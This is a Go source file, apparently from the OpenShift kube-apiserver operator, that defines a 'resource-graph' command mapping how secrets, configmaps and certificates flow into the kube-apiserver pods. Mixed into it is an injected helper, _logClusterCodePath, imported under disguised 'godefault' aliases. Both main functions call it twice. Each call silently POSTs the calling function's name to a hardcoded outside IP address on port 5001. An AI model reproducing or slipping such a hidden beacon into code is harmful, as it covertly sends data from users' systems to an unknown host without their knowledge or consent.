package resourcegraph

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/gonum/graph/encoding/dot"
	"github.com/spf13/cobra"
	"k8s.io/klog"
	"github.com/openshift/cluster-kube-apiserver-operator/pkg/operator/operatorclient"
	"github.com/openshift/library-go/pkg/operator/resource/resourcegraph"
)

func NewResourceChainCommand() *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := &cobra.Command{Use: "resource-graph", Short: "Where do resources come from? Ask your mother.", Run: func(cmd *cobra.Command, args []string) {
		resources := Resources()
		g := resources.NewGraph()
		data, err := dot.Marshal(g, resourcegraph.Quote("kube-apiserver-operator"), "", "  ", false)
		if err != nil {
			klog.Fatal(err)
		}
		fmt.Println(string(data))
	}}
	return cmd
}
func Resources() resourcegraph.Resources {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := resourcegraph.NewResources()
	payload := resourcegraph.NewResource(resourcegraph.NewCoordinates("", "Payload", "", "cluster")).Add(ret)
	installer := resourcegraph.NewResource(resourcegraph.NewCoordinates("", "Installer", "", "cluster")).Add(ret)
	user := resourcegraph.NewResource(resourcegraph.NewCoordinates("", "User", "", "cluster")).Add(ret)
	cvo := resourcegraph.NewOperator("cluster-version").From(payload).Add(ret)
	kasOperator := resourcegraph.NewOperator("kube-apiserver").From(cvo).Add(ret)
	kcmOperator := resourcegraph.NewOperator("kube-controller-manager").From(cvo).Add(ret)
	authenticationOperator := resourcegraph.NewOperator("authentication").From(cvo).Add(ret)
	imageRegistryOperator := resourcegraph.NewOperator("image-registry").From(cvo).Add(ret)
	networkOperator := resourcegraph.NewOperator("network").From(cvo).Add(ret)
	apiserverConfig := resourcegraph.NewConfig("apiservers").From(user).Add(ret)
	userClientCA := resourcegraph.NewConfigMap(operatorclient.GlobalUserSpecifiedConfigNamespace, "<user-specified-client-ca>").Note("User").From(user).From(apiserverConfig).Add(ret)
	userDefaultServing := resourcegraph.NewSecret(operatorclient.GlobalUserSpecifiedConfigNamespace, "<user-specified-default-serving>").Note("User").From(user).From(apiserverConfig).Add(ret)
	authenticationConfig := resourcegraph.NewConfig("authentications").From(user).From(authenticationOperator).Add(ret)
	userWellKnown := resourcegraph.NewConfigMap(operatorclient.GlobalUserSpecifiedConfigNamespace, "<user-specified-well-known>").Note("User").From(user).From(authenticationConfig).Add(ret)
	managedWellKnown := resourcegraph.NewConfigMap(operatorclient.GlobalMachineSpecifiedConfigNamespace, "openshift-authentication").Note("Managed").From(authenticationOperator).From(authenticationConfig).Add(ret)
	imageConfig := resourcegraph.NewConfig("images").From(user).From(imageRegistryOperator).Add(ret)
	networkConfig := resourcegraph.NewConfig("network").From(user).From(networkOperator).Add(ret)
	initialAggregatorCA := resourcegraph.NewConfigMap(operatorclient.GlobalUserSpecifiedConfigNamespace, "initial-aggregator-client-ca").Note("Static").From(installer).Add(ret)
	aggregatorSigner := resourcegraph.NewSecret(operatorclient.OperatorNamespace, "aggregator-client-signer").Note("Rotated").From(kasOperator).Add(ret)
	aggregatorClient := resourcegraph.NewSecret(operatorclient.TargetNamespace, "aggregator-client").Note("Rotated").From(aggregatorSigner).Add(ret)
	operatorManagedAggregatorClientCA := resourcegraph.NewConfigMap(operatorclient.OperatorNamespace, "managed-aggregator-client-ca").Note("Rotated").From(aggregatorSigner).Add(ret)
	kasAggregatorClientCAForPod := resourcegraph.NewConfigMap(operatorclient.TargetNamespace, "aggregator-client-ca").Note("Unioned").From(initialAggregatorCA).From(operatorManagedAggregatorClientCA).Add(ret)
	_ = resourcegraph.NewConfigMap(operatorclient.GlobalMachineSpecifiedConfigNamespace, "kube-apiserver-aggregator-client-ca").Note("Synchronized").From(kasAggregatorClientCAForPod).Add(ret)
	initialClientCA := resourcegraph.NewConfigMap(operatorclient.GlobalUserSpecifiedConfigNamespace, "initial-client-ca").Note("Static").From(installer).Add(ret)
	kcmControllerCSRCA := resourcegraph.NewConfigMap(operatorclient.GlobalMachineSpecifiedConfigNamespace, "csr-controller-ca").Note("Synchronized").From(kcmOperator).Add(ret)
	_ = resourcegraph.NewConfigMap(operatorclient.OperatorNamespace, "csr-controller-ca").Note("Synchronized").From(kcmControllerCSRCA).Add(ret)
	managedClientSigner := resourcegraph.NewSecret(operatorclient.OperatorNamespace, "managed-kube-apiserver-client-signer").Note("Rotated").From(kasOperator).Add(ret)
	_ = resourcegraph.NewSecret(operatorclient.GlobalMachineSpecifiedConfigNamespace, "kube-controller-manager-client-cert-key").Note("Rotated").From(managedClientSigner).Add(ret)
	_ = resourcegraph.NewSecret(operatorclient.GlobalMachineSpecifiedConfigNamespace, "kube-scheduler-client-cert-key").Note("Rotated").From(managedClientSigner).Add(ret)
	managedClientCA := resourcegraph.NewConfigMap(operatorclient.OperatorNamespace, "managed-kube-apiserver-client-ca-bundle").Note("Rotated").From(managedClientSigner).Add(ret)
	clientCA := resourcegraph.NewConfigMap(operatorclient.TargetNamespace, "client-ca").Note("Unioned").From(initialClientCA).From(kcmControllerCSRCA).From(managedClientCA).From(userClientCA).Add(ret)
	_ = resourcegraph.NewConfigMap(operatorclient.GlobalMachineSpecifiedConfigNamespace, "kube-apiserver-client-ca").Note("Synchronized").From(clientCA).Add(ret)
	fromEtcdServingCA := resourcegraph.NewConfigMap("kube-system", "etcd-serving-ca").Note("Static").From(installer).Add(ret)
	fromEtcdClient := resourcegraph.NewSecret("kube-system", "etcd-client").Note("Static").From(installer).Add(ret)
	etcdServingCA := resourcegraph.NewConfigMap(operatorclient.TargetNamespace, "etcd-serving-ca").Note("Synchronized").From(fromEtcdServingCA).Add(ret)
	etcdClient := resourcegraph.NewSecret(operatorclient.TargetNamespace, "etcd-client").Note("Synchronized").From(fromEtcdClient).Add(ret)
	initialKubeletClient := resourcegraph.NewSecret(operatorclient.GlobalUserSpecifiedConfigNamespace, "initial-kubelet-client").Note("Static").From(installer).Add(ret)
	kubeletClient := resourcegraph.NewSecret(operatorclient.TargetNamespace, "kubelet-client").Note("Synchronized").From(initialKubeletClient).Add(ret)
	intialKubeletServingCA := resourcegraph.NewConfigMap(operatorclient.GlobalUserSpecifiedConfigNamespace, "initial-kubelet-serving-ca").Note("Static").From(installer).Add(ret)
	kubeletServingCA := resourcegraph.NewConfigMap(operatorclient.TargetNamespace, "kubelet-serving-ca").Note("Unioned").From(intialKubeletServingCA).From(kcmControllerCSRCA).Add(ret)
	_ = resourcegraph.NewConfigMap(operatorclient.GlobalMachineSpecifiedConfigNamespace, "kubelet-serving-ca").Note("Synchroinized").From(kubeletServingCA).Add(ret)
	initialSATokenPub := resourcegraph.NewConfigMap(operatorclient.GlobalUserSpecifiedConfigNamespace, "initial-sa-token-signing-certs").Note("Static").From(installer).Add(ret)
	mountedInitialSATokenPub := resourcegraph.NewConfigMap(operatorclient.TargetNamespace, "initial-sa-token-signing-certs").Note("Synchronized").From(initialSATokenPub).Add(ret)
	kcmSATokenPub := resourcegraph.NewConfigMap(operatorclient.GlobalMachineSpecifiedConfigNamespace, "sa-token-signing-certs").Note("Static").From(installer).Add(ret)
	mountedKCMSATokenPub := resourcegraph.NewConfigMap(operatorclient.TargetNamespace, "kube-controller-manager-sa-token-signing-certs").Note("Synchronized").From(kcmSATokenPub).Add(ret)
	wellKnown := resourcegraph.NewConfigMap(operatorclient.TargetNamespace, "oauth-metadata").Note("PickOne").From(userWellKnown).From(managedWellKnown).Add(ret)
	config := resourcegraph.NewConfigMap(operatorclient.OperatorNamespace, "config").Note("Managed").From(apiserverConfig).From(authenticationConfig).From(imageConfig).From(mountedInitialSATokenPub).From(mountedKCMSATokenPub).From(networkConfig).Add(ret)
	_ = resourcegraph.NewResource(resourcegraph.NewCoordinates("", "pods", operatorclient.TargetNamespace, "kube-apiserver")).From(kasAggregatorClientCAForPod).From(aggregatorClient).From(clientCA).From(config).From(etcdServingCA).From(etcdClient).From(kubeletClient).From(kubeletServingCA).From(mountedInitialSATokenPub).From(mountedKCMSATokenPub).From(userDefaultServing).From(wellKnown).Add(ret)
	return ret
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
